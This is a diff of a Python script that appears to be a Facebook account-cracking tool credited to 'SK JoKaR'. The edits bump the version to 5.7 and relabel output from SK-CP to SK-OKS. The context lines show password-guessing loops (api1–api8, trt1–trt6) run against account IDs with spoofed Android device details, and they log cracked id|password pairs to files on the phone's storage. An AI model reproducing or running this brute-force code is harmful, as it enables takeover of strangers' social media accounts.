@@ -98,7 +98,7 @@ fblc = 'en_GB'
 try:
         fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
 except:
-        fbcr = 'Zong'
+        fbcr =  'Zong'
 fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
 fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
 fbdv = model
@@ -119,13 +119,13 @@ try:
                         fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                         sim_id+=fbcr
                 except Exception as e:
-                        fbcr = "Zong"
+                        fbcr = "jazz"
                         sim_id+=fbcr
         else:
                 fbcr = 'Zong'
                 sim_id+=fbcr
 except:
-        fbcr = "Zong"
+        fbcr = "jazz"
 device = {
         'android_version':android_version,
         'model':model,
@@ -151,7 +151,7 @@ logo=("""\033[1;91m
 [~] Author   : SK JoKaR
 [~] Facebook : Shayan khan
 [~] Tool     : Free
-[~] Version  : 5.6
+[~] Version  : 5.7
 \033[1;37m----------------------------------------------""")
 def linex():
 	print('\033[1;37m----------------------------------------------')
@@ -354,7 +354,7 @@ def pak():
 def gmail():
 		os.system('rm -rf .re.txt')
 		clear()
-		print('\033[1;37m example: ramzan, ali, sajjad, faizan\033[1;97m')
+		print('\033[1;37m example: shayan, khan, ali, faizan\033[1;97m')
 		linex()
 		first = input(' Put first name: ')
 		linex()
@@ -508,12 +508,12 @@ def api1(ids,names,passlist):
 					break
 				elif 'www.facebook.com' in q['error_msg']:
 					if 'y' in pcp:
-						print('\r\r\x1b[38;5;205m [SK-CP] '+ids+' | '+pas+'\033[1;97m')
-						open('/sdcard/SK-CP.txt','a').write(ids+'|'+pas+'\n')
+						print('\r\r\x1b[38;5;205m [SK-OKS] '+ids+' | '+pas+'\033[1;97m')
+						open('/sdcard/SK-OKS.txt','a').write(ids+'|'+pas+'\n')
 						cps.append(ids)
 						break
 					else:
-						open('/sdcard/SK-CP.txt','a').write(ids+'|'+pas+'\n')
+						open('/sdcard/SK-OKS.txt','a').write(ids+'|'+pas+'\n')
 						break
 				else:
 					continue
@@ -589,12 +589,12 @@ def api2(ids,names,passlist):
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [SK-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/SK-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;205m [SK-OKS] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/SK-OKS.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/SK-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/SK-OKS.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -688,12 +688,12 @@ def api3(ids,names,passlist):
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [SK-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/SK-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;205m [SK-OKS] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/SK-OKS.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/SK-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/SK-OKS.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -786,12 +786,12 @@ def api4(ids,names,passlist):
                                                 break
                         elif 'www.facebook.com' in po['error_msg']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;206m [SK-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/SK-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;206m [SK-OKS] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/SK-OKS.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/SK-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/SK-OKS.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -905,12 +905,12 @@ def api5(ids,names,passlist):
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [SK-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/SK-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;205m [SK-OKS] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/SK-OKS.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/SK-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/SK-OKS.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -947,8 +947,8 @@ def api6(ids,names,passlist):
 				break
 			elif 'checkpoint' in SK:
 				if 'y' in pcp:
-					print('\r\r\x1b[38;5;205m [SK-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/SK-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					print('\r\r\x1b[38;5;205m [SK-OKS] '+ids+' | '+pas+'\033[1;97m')
+					open('/sdcard/SK-OKS.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -989,8 +989,8 @@ def api7(ids,names,passlist):
 				break
 			elif 'checkpoint' in SK:
 				if 'y' in pcp:
-					print('\r\r\x1b[38;5;205m [SK-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/SK-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					print('\r\r\x1b[38;5;205m [SK-OKS] '+ids+' | '+pas+'\033[1;97m')
+					open('/sdcard/SK-OKS.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -1030,8 +1030,8 @@ def api8(ids,names,passlist):
 				break
 			elif 'checkpoint' in SK:
 				if 'y' in pcp:
-					print('\r\r\x1b[38;5;205m [SK-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/SK-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					print('\r\r\x1b[38;5;205m [SK-OKS] '+ids+' | '+pas+'\033[1;97m')
+					open('/sdcard/SK-OKS.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -1140,7 +1140,7 @@ def trt1(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[38;5;205m [SK-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\x1b[38;5;205m [SK-OKS] '+str(uid)+' | '+pas+'\033[1;97m')
                                         open('/sdcard/SK-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
@@ -1215,7 +1215,7 @@ def trt2(ids,passlist):
 				oks.append(ids)
 				break
 			elif 'www.facebook.com' in q['error_msg']:
-				print('\r\r\x1b[38;5;205m [SK-CP] '+ids+' | '+pas+'\033[1;97m')
+				print('\r\r\x1b[38;5;205m [SK-OKS] '+ids+' | '+pas+'\033[1;97m')
 				open('/sdcard/SK-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
 				cps.append(ids)
 				break
@@ -1318,7 +1318,7 @@ def trt3(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[38;5;205m [SK-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\x1b[38;5;205m [SK-OKS] '+str(uid)+' | '+pas+'\033[1;97m')
                                         open('/sdcard/SK-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
@@ -1413,7 +1413,7 @@ def trt4(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[38;5;205m [SK-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\x1b[38;5;205m [SK-OKS] '+str(uid)+' | '+pas+'\033[1;97m')
                                         open('/sdcard/SK-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
@@ -1505,7 +1505,7 @@ def trt5(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[38;5;205m [SK-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\x1b[38;5;205m [SK-OKS] '+str(uid)+' | '+pas+'\033[1;97m')
                                         open('/sdcard/SK-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
@@ -1571,7 +1571,7 @@ def trt6(ids,passlist):
 				uid=coki[141:156]
 				if uid in cps:pass
 				else:
-					print('\r\r\x1b[38;5;205m [SK-CP] '+uid+' | '+pas+'\033[1;97m')
+					print('\r\r\x1b[38;5;205m [SK-OKS] '+uid+' | '+pas+'\033[1;97m')
 					open('/sdcard/SK-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
 					cps.append(ids)
 					break
